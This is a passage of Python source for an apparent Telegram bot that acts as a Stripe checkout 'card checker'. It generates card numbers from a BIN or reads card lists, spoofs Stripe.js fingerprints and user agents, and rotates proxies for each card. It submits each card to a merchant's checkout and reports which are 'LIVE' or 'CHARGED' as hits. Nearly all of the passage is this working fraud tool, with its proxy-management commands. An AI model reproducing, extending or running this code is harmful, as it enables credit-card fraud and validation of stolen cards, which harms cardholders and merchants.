                    f"&payment_method_data[muid]={fp['muid']}"
                    f"&payment_method_data[sid]={fp['sid']}"
                    f"&payment_method_data[payment_user_agent]={get_random_stripe_js_agent()}"
                    f"&payment_method_data[time_on_page]={time_on_page}"
                    f"&payment_method_data[pasted_fields]=number"
                    f"&expected_amount={total}"
                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card"
                    f"&key={pk}"
                    f"&init_checksum={checksum}"
                )
                
                headers = get_headers(stripe_js=True)
                
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                    headers=headers,
                    data=conf_body,
                    proxy=proxy_url
                ) as r:
                    conf = await r.json()
                
                print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
                
                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    err_code = err.get("code", "")
                    
                    # Check if session is expired/inactive
                    if err_code == 'checkout_not_active_session' or 'no longer active' in msg.lower():
                        result["status"] = "SESSION_EXPIRED"
                    # Check if decline code indicates card is LIVE
                    elif dc in LIVE_DECLINE_CODES:
                        result["status"] = "LIVE"
                    else:
                        result["status"] = "DECLINED"
                    if dc:
                        result["response"] = f"[{dc}] [{msg}]"
                    elif err_code:
                        result["response"] = f"[{err_code}] [{msg}]"
                    else:
                        result["response"] = msg
                    print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        result["status"] = "3DS"
                        result["response"] = "3DS Skipped"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"
                
                result["time"] = round(time.perf_counter() - start, 2)
                print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
                return result
                    
        except Exception as e:
            err_str = str(e)
            print(f"[DEBUG] ❌ Error: {err_str[:50]}")
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                print(f"[DEBUG] Retrying in 1s...")
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
            return result
    
    return result

# check_tokenization_support removed — no longer needed with Stripe.js emulation

async def check_checkout_active(pk: str, cs: str) -> bool:
    try:
        s = await get_session()
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/init",
            headers=get_headers(),
            data=body,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as r:
            data = await r.json()
            return "error" not in data
    except:
        return False

@router.message(Command("addproxy"))
async def addproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    user_proxies = get_user_proxies(user_id)
    
    if len(args) < 2:
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 𝗔𝗹𝗹 : <code>/removeproxy all</code>\n"
            "「❃」 𝗖𝗵𝗲𝗰𝗸 : <code>/proxy check</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗙𝗼𝗿𝗺𝗮𝘁𝘀 :\n"
            "    • <code>host:port:user:pass</code>\n"
            "    • <code>user:pass@host:port</code>\n"
            "    • <code>host:port</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = args[1].strip()
    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
    
    # Auto-delete user message to hide proxy credentials
    try:
        await msg.delete()
    except:
        pass
    
    if not proxies_to_add:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No valid proxies provided</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(proxies_to_add)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = await check_proxies_batch(proxies_to_add, max_threads=10)
    
    alive_proxies = []
    dead_proxies = []
    
    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)
    
    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive_proxies)}/{len(proxies_to_add)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead_proxies)}/{len(proxies_to_add)} ❌</code></blockquote>\n\n"
    
    if alive_proxies:
        response += "<blockquote>「❃」 𝗔𝗱𝗱𝗲𝗱 :\n"
        for p in alive_proxies[:5]:
            response += f"    • <code>{p['proxy']}</code> ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"    • <code>... and {len(alive_proxies) - 5} more</code>\n"
        response += "</blockquote>"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@router.message(Command("removeproxy"))
async def removeproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    
    if len(args) < 2:
        await msg.answer(
            "<blockquote><code>𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆 🗑️</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗔𝗹𝗹 : <code>/removeproxy all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = args[1].strip()
    
    if proxy_input.lower() == "all":
        user_proxies = get_user_proxies(user_id)
        count = len(user_proxies)
        remove_user_proxy(user_id, "all")
        await msg.answer(
            "<blockquote><code>𝗔𝗹𝗹 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 : <code>{count} proxies</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if remove_user_proxy(user_id, proxy_input):
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_input}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
    else:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Proxy not found</code></blockquote>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("globalproxy"))
async def globalproxy_handler(msg: Message):
    # Only owner can manage global proxies
    if msg.from_user.id != OWNER_ID:
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Owner only</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=2)
    global_proxies = get_global_proxies()
    
    # Auto-delete user message to hide proxy credentials
    if len(msg.text.split()) > 2:
        try:
            await msg.delete()
        except:
            pass
    
    # No args — show current global proxies
    if len(args) < 2:
        if global_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in global_proxies[:15]])
            if len(global_proxies) > 15:
                proxy_list += f"\n    • <code>... and {len(global_proxies) - 15} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await msg.answer(
            "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 🌍</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(global_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/globalproxy add proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/globalproxy remove proxy</code>\n"
            "「❃」 𝗖𝗹𝗲𝗮𝗿 : <code>/globalproxy remove all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    action = args[1].lower()
    
    if action == "add" and len(args) > 2:
        proxy_text = args[2].strip()
        lines = msg.text.split('\n')
        proxies_to_add = []
        for line in lines:
            line = line.strip()
            if ':' in line and not line.startswith('/'):
                proxies_to_add.append(line)
        
        if not proxies_to_add and proxy_text:
            proxies_to_add = [proxy_text]
        
        if not proxies_to_add:
            await msg.answer(
                "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No valid proxies</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
            return
        
        checking_msg = await msg.answer(
            "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(proxies_to_add)}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        
        results = await check_proxies_batch(proxies_to_add, max_threads=10)
        added = 0
        for r in results:
            if r["status"] == "alive":
                add_global_proxy(r["proxy"])
                added += 1
        
        total_now = len(get_global_proxies())
        await checking_msg.edit_text(
            "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 𝗔𝗱𝗱𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗔𝗱𝗱𝗲𝗱 : <code>{added}/{len(proxies_to_add)} ✅</code>\n"
            f"「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{total_now} proxies</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
    
    elif action == "remove" and len(args) > 2:
        target = args[2].strip()
        if remove_global_proxy(target):
            total_now = len(get_global_proxies())
            await msg.answer(
                "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 : <code>{total_now} proxies</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
        else:
            await msg.answer(
                "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No global proxies found</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
    else:
        await msg.answer(
            "<blockquote><code>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 🌍</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/globalproxy add proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/globalproxy remove proxy</code>\n"
            "「❃」 𝗖𝗹𝗲𝗮𝗿 : <code>/globalproxy remove all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("proxy"))
async def proxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    
    if len(args) < 2 or args[1].strip().lower() != "check":
        user_proxies = get_user_proxies(user_id)
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗹 : <code>/proxy check</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_proxies = get_user_proxies(user_id)
    
    if not user_proxies:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No proxies to check</code>\n"
            "「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(user_proxies)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = await check_proxies_batch(user_proxies, max_threads=10)
    
    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]
    
    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 📊</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive)}/{len(user_proxies)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead)}/{len(user_proxies)} ❌</code></blockquote>\n\n"
    
    if alive:
        response += "<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in alive[:5]:
            ip_display = p['external_ip'] or 'N/A'
            response += f"    • <code>{p['proxy']}</code>\n      IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"    • <code>... and {len(alive) - 5} more</code>\n"
        response += "</blockquote>\n\n"
    
    if dead:
        response += "<blockquote>「❃」 𝗗𝗲𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in dead[:3]:
            error = p.get('error', 'Unknown')
            response += f"    • <code>{p['proxy']}</code> ({error})\n"
        if len(dead) > 3:
            response += f"    • <code>... and {len(dead) - 3} more</code>\n"
        response += "</blockquote>"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@router.message(Command(CMD_NAME))
async def co_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@sambat1234</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    lines = text.strip().split('\n')
    first_line_args = lines[0].split(maxsplit=3)
    
    if len(first_line_args) < 2:
        await msg.answer(
            f"<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 ⚡ [{SERVER_DISPLAY}]</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/{CMD_NAME} url</code>\n"
            f"「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/{CMD_NAME} url cc|mm|yy|cvv</code>\n"
            f"「❃」 𝗕��𝗡 : <code>/{CMD_NAME} url BIN</code>\n"
            f"「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /{CMD_NAME} url</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = extract_checkout_url(first_line_args[1])
    if not url:
        url = first_line_args[1].strip()
    
    cards = []
    bin_used = None
    
    if len(first_line_args) > 2:
        arg2 = first_line_args[2].strip()
        if is_bin_input(arg2):
            bin_used = re.sub(r'\D', '', arg2)
            cards = generate_cards_from_bin(bin_used, 10)
        else:
            cards = parse_cards(arg2)
    
    if len(lines) > 1 and not bin_used:
        remaining_text = '\n'.join(lines[1:])
        # Check if second line is a BIN
        second_line = lines[1].strip()
        if is_bin_input(second_line) and not cards:
            bin_used = re.sub(r'\D', '', second_line)
            cards = generate_cards_from_bin(bin_used, 10)
        else:
            cards.extend(parse_cards(remaining_text))
    
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if doc.file_name and doc.file_name.endswith('.txt'):
            try:
                file = await msg.bot.get_file(doc.file_id)
                file_content = await msg.bot.download_file(file.file_path)
                text_content = file_content.read().decode('utf-8')
                cards = parse_cards(text_content)
            except Exception as e:
                await msg.answer(
                    "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Failed to read file: {str(e)}</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
                return
    
    user_proxies = get_user_proxies(user_id)
    proxy_display = "DIRECT 🌐"
    
    if not user_proxies:
        proxy_display = "DIRECT 🌐"
    elif len(user_proxies) == 1:
        proxy_info = await get_proxy_info(user_proxies[0])
        if proxy_info["status"] == "dead":
            proxy_display = "DEAD ❌"
        else:
            proxy_display = f"LIVE ✅ | {proxy_info['ip_obfuscated']}"
    else:
        proxy_display = f"ROTATING 🔄 | {len(user_proxies)} proxies"
    
    
    processing_msg = await msg.answer(
        "<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        "「❃」 �𝘁�𝗮𝘁𝘂𝘀 : <code>Parsing checkout...</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    checkout_data = await get_checkout_info(url)
    
    if checkout_data.get("error"):
        await processing_msg.edit_text(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>{checkout_data['error']}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not cards:
        currency = checkout_data.get('currency', '')
        sym = get_currency_symbol(currency)
        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
        total_time = round(time.perf_counter() - start_time, 2)
        
        response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 {price_str} 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗦𝗲𝗿𝘃𝗲𝗿 : <code>{SERVER_DISPLAY}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗖𝗦 : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗞 : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code></blockquote>\n\n"
        
        response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{checkout_data['country'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗠𝗼𝗱𝗲 : <code>{checkout_data['mode'] or 'N/A'}</code></blockquote>\n\n"
        
        if checkout_data['customer_name'] or checkout_data['customer_email']:
            response += f"<blockquote>「❃」 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 : <code>{checkout_data['customer_name'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗘𝗺𝗮𝗶𝗹 : <code>{checkout_data['customer_email'] or 'N/A'}</code></blockquote>\n\n"
        
        if checkout_data['support_email'] or checkout_data['support_phone']:
            response += f"<blockquote>「❃」 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : <code>{checkout_data['support_email'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗣𝗵𝗼𝗻𝗲 : <code>{checkout_data['support_phone'] or 'N/A'}</code></blockquote>\n\n"
        
        if checkout_data['cards_accepted']:
            response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{checkout_data['cards_accepted']}</code></blockquote>\n\n"
        
        if checkout_data['success_url'] or checkout_data['cancel_url']:
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 : <code>{checkout_data['success_url'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗖𝗮𝗻𝗰𝗲𝗹 : <code>{checkout_data['cancel_url'] or 'N/A'}</code></blockquote>\n\n"
        
        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/{CMD_NAME}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
        
        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
        return
    
    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
    
    bin_display = f"\n「❃」 𝗕𝗜𝗡 : <code>{bin_used}</code>" if bin_used else ""
    
    await processing_msg.edit_text(
        f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗦𝗲𝗿𝘃𝗲𝗿 : <code>{SERVER_DISPLAY}</code>\n"
        f"「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>{bin_display}\n"
        f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
        f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = []
    charged_card = None
    cancelled = False
    check_interval = 5
    last_update = time.perf_counter()
    
    for i, card in enumerate(cards):
        if len(cards) > 1 and i > 0 and i % check_interval == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                cancelled = True
                break
        
        # Rotate proxy per card
        card_proxy = get_user_proxy(user_id)
        result = await charge_card(card, checkout_data, card_proxy, user_id=user_id)
        results.append(result)
        
        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            live = sum(1 for r in results if r['status'] == 'LIVE')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] == '3DS')
            errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
            
            try:
                await processing_msg.edit_text(
                    f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
                    f"「❃」 𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} 😎</code>\n"
                    f"「❃」 �𝗶𝘃𝗲 : <code>{live} ✅</code>\n"
                    f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} 🥲</code>\n"
                    f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 😡</code>\n"
                    f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} 💀</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        if result['status'] == 'CHARGED':
            charged_card = result
            break
        if result['status'] == 'SESSION_EXPIRED':
            break
    
    total_time = round(time.perf_counter() - start_time, 2)
    
    # Determine header
    if cancelled:
        header = f"「 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱 ⛔ 」"
    else:
        header = f"「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 {price_str} 」 💸"
    
    response = f"<blockquote><code>{header}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
    response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"
    
    # Per-card results
    max_display = 15
    display_results = results
    skipped = 0
    if len(results) > max_display:
        display_results = results[:5] + results[-(max_display - 5):]
        skipped = len(results) - max_display
    
    for i, r in enumerate(display_results):
        s_emoji = STATUS_EMOJIS.get(r['status'], '❓')
        response += f"⸙ 𝑪𝒂𝒓𝒅 ➜ <code>{r['card']}</code>\n"
        response += f"⌬ 𝑺𝒕𝒂𝒕𝒖𝒔 ➜ {r['status']} {s_emoji}\n"
        response += f"❖ 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➜ <code>{r['response']}</code>\n"
        if i < len(display_results) - 1:
            if skipped > 0 and i == 4:
                response += f"       ⋯ {skipped} 𝗺𝗼𝗿𝗲 𝗰𝗮𝗿𝗱𝘀 ⋯\n"
            response += f"{CARD_SEPARATOR}\n"
    
    # Summary
    charged_count = sum(1 for r in results if r['status'] == 'CHARGED')
    live_count = sum(1 for r in results if r['status'] == 'LIVE')
    declined_count = sum(1 for r in results if r['status'] == 'DECLINED')
    three_ds_count = sum(1 for r in results if r['status'] == '3DS')
    error_count = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN', 'NOT SUPPORTED'])
    
    response += f"\n<blockquote>💲 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:\n"
    response += f"😎 𝗛𝗶𝘁𝘀: {charged_count}\n"
    if live_count > 0:
